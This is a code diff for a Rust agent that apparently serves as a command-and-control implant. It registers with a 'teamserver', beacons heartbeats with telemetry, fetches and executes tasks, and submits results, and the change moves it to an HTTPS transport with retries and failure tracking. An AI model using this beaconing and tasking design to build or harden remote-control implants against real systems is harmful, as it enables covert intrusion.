@@ -1,6 +1,8 @@
 use crate::config::AgentConfig;
-use crate::protocol::{AgentRegistration, HeartbeatRequest, TaskMessage, TaskResult, TelemetryPayload};
+use crate::protocol::{AgentRegistration, HeartbeatRequest, TaskMessage, TaskResult, TelemetryPayload, TransportStatus};
 use crate::state::AgentState;
+use crate::transport::https::HttpsTransport;
+use anyhow::Context;
 use base64::{engine::general_purpose, Engine as _};
 use hostname::get;
 use log::{error, info};
@@ -63,33 +65,34 @@ pub async fn run() -> anyhow::Result<()> {
         },
     };
 
-    let client = reqwest::Client::new();
+    let transport = HttpsTransport::new(&cfg)?;
 
     // Register with the teamserver if we don't have a token yet.
     if state.token.is_none() {
         info!("registering agent with teamserver");
 
         let reg = build_registration(&state.agent_id)?;
+        let res = transport
+            .post_json("/api/register", &reg)
+            .await
+            .context("registration request failed")?;
 
-        let resp = client
-            .post(format!("{}/api/register", cfg.server_url))
-            .json(&reg)
-            .send()
-            .await?;
-
-        if !resp.status().is_success() {
-            return Err(anyhow::anyhow!("register failed: {}", resp.status()));
-        }
-
-        let body: serde_json::Value = resp.json().await?;
+        let body: serde_json::Value = serde_json::from_slice(&res.body)?;
         if let Some(token) = body.get("token").and_then(|v| v.as_str()) {
-            state.token = Some(token.to_string());
+            state.token = Some(zeroize::Zeroizing::new(token.to_string()));
             state.save()?;
             info!("received agent token");
         } else {
             return Err(anyhow::anyhow!("register response missing token"));
         }
     }
+
+    let mut transport_status = TransportStatus {
+        consecutive_failures: 0,
+        last_error: None,
+        last_backoff_ms: None,
+        last_attempt_at: None,
+    };
 
     loop {
         let uptime = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
@@ -109,26 +112,31 @@ pub async fn run() -> anyhow::Result<()> {
 
         let hb = HeartbeatRequest {
             agent_id: state.agent_id.clone(),
-            token: state.token.clone().unwrap_or_default(),
+            token: state
+                .token
+                .as_ref()
+                .map(|t| t.to_string())
+                .unwrap_or_default(),
             telemetry,
+            transport: Some(transport_status.clone()),
         };
 
-        let resp = client
-            .post(format!("{}/api/heartbeat", cfg.server_url))
-            .json(&hb)
-            .send()
-            .await;
+        match transport.post_json("/api/heartbeat", &hb).await {
+            Ok(res) => {
+                transport_status.consecutive_failures = 0;
+                transport_status.last_error = None;
+                transport_status.last_backoff_ms = res.last_backoff_ms;
+                transport_status.last_attempt_at = Some(chrono::Utc::now().to_rfc3339());
+                info!("heartbeat successful (retries={})", res.retries);
 
-        match resp {
-            Ok(r) if r.status().is_success() => {
-                info!("heartbeat successful");
+                let body = res.body;
 
-                if let Ok(body) = r.json::<serde_json::Value>().await {
-                    if let Some(tasks) = body.get("tasks") {
+                if let Ok(resp) = serde_json::from_slice::<serde_json::Value>(&body) {
+                    if let Some(tasks) = resp.get("tasks") {
                         if let Ok(tasks) = serde_json::from_value::<Vec<TaskMessage>>(tasks.clone()) {
                             for task in tasks {
                                 let result = execute_task(&state, task).await;
-                                if let Err(e) = submit_task_result(&client, &cfg, &result).await {
+                                if let Err(e) = submit_task_result(&transport, &cfg, &result).await {
                                     error!("failed to submit task result: {}", e);
                                 }
                             }
@@ -136,10 +144,11 @@ pub async fn run() -> anyhow::Result<()> {
                     }
                 }
             }
-            Ok(r) => {
-                error!("heartbeat failed: {}", r.status());
-            }
             Err(e) => {
+                transport_status.consecutive_failures += 1;
+                transport_status.last_error = Some(e.to_string());
+                transport_status.last_attempt_at = Some(chrono::Utc::now().to_rfc3339());
+                transport_status.last_backoff_ms = None;
                 error!("heartbeat error: {}", e);
             }
         }
@@ -153,7 +162,11 @@ pub async fn run() -> anyhow::Result<()> {
 async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
     let build_result = |status: &str, output: String, error: Option<String>| TaskResult {
         agent_id: state.agent_id.clone(),
-        token: state.token.clone().unwrap_or_default(),
+        token: state
+            .token
+            .as_ref()
+            .map(|t| t.to_string())
+            .unwrap_or_default(),
         task_id: task.task_id.clone(),
         status: status.to_string(),
         output,
@@ -299,21 +312,16 @@ async fn execute_task(state: &AgentState, task: TaskMessage) -> TaskResult {
 }
 
 async fn submit_task_result(
-    client: &reqwest::Client,
-    cfg: &AgentConfig,
+    transport: &HttpsTransport,
+    _cfg: &AgentConfig,
     result: &TaskResult,
 ) -> anyhow::Result<()> {
-    let resp = client
-        .post(format!("{}/api/task/result", cfg.server_url))
-        .json(result)
-        .send()
-        .await?;
+    let _res = transport
+        .post_json("/api/task/result", result)
+        .await
+        .context("submit task result")?;
 
-    if !resp.status().is_success() {
-        Err(anyhow::anyhow!("failed to submit task result: {}", resp.status()))
-    } else {
-        Ok(())
-    }
+    Ok(())
 }
 
 #[cfg(test)]
